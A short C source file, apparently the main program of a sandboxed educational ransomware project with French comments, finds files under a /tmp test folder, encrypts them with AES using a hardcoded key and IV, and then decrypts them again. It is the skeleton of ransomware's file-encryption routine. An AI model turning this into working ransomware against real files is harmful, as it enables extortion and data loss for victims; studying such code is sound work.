#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/evp.h>

#include "crypto_aes.h"
#include "files_finder.h"

int main(int argc, char const *argv[])
{
    /* code */

    unsigned char* cle = "77e7b3e71fe30c9a1f653d67943bdd19a82bbada9f0ff804a325ff8515637cb3";
    unsigned char* iv = "dc1ad035ef18bf8eeb4fde6d232dc51c";

    char* paths[] = {"/tmp/sandbox-ransomware/"};
    /* Initialisation de la structure pour la recherche de fichier */
    listFileData* p_listFileData = init_list_file_data();

    /* Indexation des fichiers à chiffrer */
    files_finder(p_listFileData, paths, 1);

    /* Affichage des fichiers indexés */
    //print_path_data(p_listFileData);

    /* Génération structure clé de chiffrement */
    EVP_CIPHER_CTX* p_e_ctx = load_encryption_key(cle, iv);

    /* Chiffrement aes */
    aes_encrypt_files(p_listFileData, p_e_ctx);

    /* Génération structure clé de déchiffrement */
    EVP_CIPHER_CTX* p_d_ctx = load_decryption_key(cle, iv);

    /* Déchiffrement aes */
    aes_decrypt_files(p_listFileData, p_d_ctx);

    free_path_data(p_listFileData);
    EVP_CIPHER_CTX_free(p_e_ctx);
    EVP_CIPHER_CTX_free(p_d_ctx);

    return 0;
}
